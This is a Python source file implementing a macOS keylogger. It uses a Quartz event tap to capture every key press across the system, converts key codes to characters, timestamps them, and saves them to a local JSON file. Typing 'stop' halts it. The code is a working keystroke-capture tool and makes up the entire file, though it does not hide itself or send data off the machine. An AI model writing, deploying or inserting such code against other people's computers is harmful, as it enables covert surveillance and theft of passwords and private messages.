#Copyright (c) 2024 Eli Fisher
import Quartz
import datetime
import json
import threading
from pytz import timezone  # For timezone handling


class MacKeyLogger:
    def __init__(self):
        self.log = []
        self.active = False
        self.thread = None
        self.file_name = "keylog.json"
        self.current_buffer = ""
        self.stop_callback = None  # Callback to notify the main program when "stop" is detected globally

    def callback(self, proxy, event_type, event, refcon):
        if self.active and event_type == Quartz.kCGEventKeyDown:
            key_code = Quartz.CGEventGetIntegerValueField(event, Quartz.kCGKeyboardEventKeycode)
            key_string = self.key_code_to_string(key_code)
            local_tz = timezone("Asia/Jerusalem")  # Adjust timezone as needed
            timestamp = datetime.datetime.now(local_tz).isoformat()
            self.log.append({"key": key_string, "timestamp": timestamp})

            # Track "stop" globally
            if key_string == "Space":
                self.current_buffer += " "
            elif key_string not in ["Return", "Tab", "Backspace", "Escape"]:
                self.current_buffer += key_string

            if "stop" in self.current_buffer.lower():
                print("'stop' detected globally. Stopping keylogger.")
                if self.stop_callback:
                    self.stop_callback(global_stop=True)  # Notify main program of a global stop
                self.stop_async()
        return event

    def key_code_to_string(self, key_code):
        key_map = {
            0: "A", 1: "S", 2: "D", 3: "F", 4: "H", 5: "G", 6: "Z", 7: "X",
            8: "C", 9: "V", 11: "B", 12: "Q", 13: "W", 14: "E", 15: "R", 16: "Y",
            17: "T", 31: "O", 32: "U", 34: "I", 35: "P", 37: "L", 38: "J", 40: "K",
            41: ";", 42: "'", 45: "N", 46: "M",

            18: "1", 19: "2", 20: "3", 21: "4", 22: "6", 23: "5", 24: "=", 25: "9",
            26: "7", 27: "-", 28: "8", 29: "0",

            33: "[", 30: "]", 39: ",", 43: ".", 44: "/", 47: "\\", 50: "`",

            55: "Command", 56: "Shift", 57: "Caps Lock", 58: "Option", 59: "Control",
            60: "Right Shift", 61: "Right Option", 62: "Right Control",

            96: "F5", 97: "F6", 98: "F7", 99: "F3", 100: "F8", 101: "F9", 103: "F11",
            105: "F13", 106: "F16", 107: "F14", 109: "F10", 111: "F12", 113: "F15",
            114: "Help", 115: "Home", 116: "Page Up", 117: "Delete", 118: "F4",
            119: "End", 120: "F2", 121: "Page Down", 122: "F1", 123: "Left Arrow",
            124: "Right Arrow", 125: "Down Arrow", 126: "Up Arrow",

            36: "Return", 48: "Tab", 49: "Space", 51: "Backspace", 53: "Escape",
        }
        return key_map.get(key_code, f"Unknown({key_code})")

    def save_log(self):
        if self.log:
            with open(self.file_name, "w") as f:
                json.dump(self.log, f, indent=4)
            print(f"Keylog saved to {self.file_name}")
            self.log = []  # Clear the log after saving
            self.current_buffer = ""  # Reset buffer
        else:
            print("No data to save.")

    def start(self, stop_callback=None):
        self.active = True
        self.stop_callback = stop_callback  # Assign the callback function
        self.log = []  # Clear any previous logs
        self.current_buffer = ""  # Reset buffer
        with open(self.file_name, "w") as f:
            json.dump([], f)  # Clear the file to start fresh
        self.thread = threading.Thread(target=self.run)
        self.thread.start()
        print("Keylogger started and logging from the beginning.")

    def stop(self):
        if self.active:
            self.active = False
            self.save_log()
            print("Keylogger stopped.")
        else:
            print("Keylogger is not running.")

    def stop_async(self):
        if self.active:
            self.active = False
            Quartz.CFRunLoopStop(Quartz.CFRunLoopGetCurrent())

    def run(self):
        tap = Quartz.CGEventTapCreate(
            Quartz.kCGHIDEventTap,
            Quartz.kCGHeadInsertEventTap,
            Quartz.kCGEventTapOptionDefault,
            Quartz.CGEventMaskBit(Quartz.kCGEventKeyDown),
            self.callback,
            None,
        )
        if not tap:
            print("Failed to create event tap. Ensure the script has Accessibility permissions.")
            return

        run_loop_source = Quartz.CFMachPortCreateRunLoopSource(None, tap, 0)
        Quartz.CFRunLoopAddSource(
            Quartz.CFRunLoopGetCurrent(),
            run_loop_source,
            Quartz.kCFRunLoopCommonModes,
        )
        Quartz.CGEventTapEnable(tap, True)

        Quartz.CFRunLoopRun()

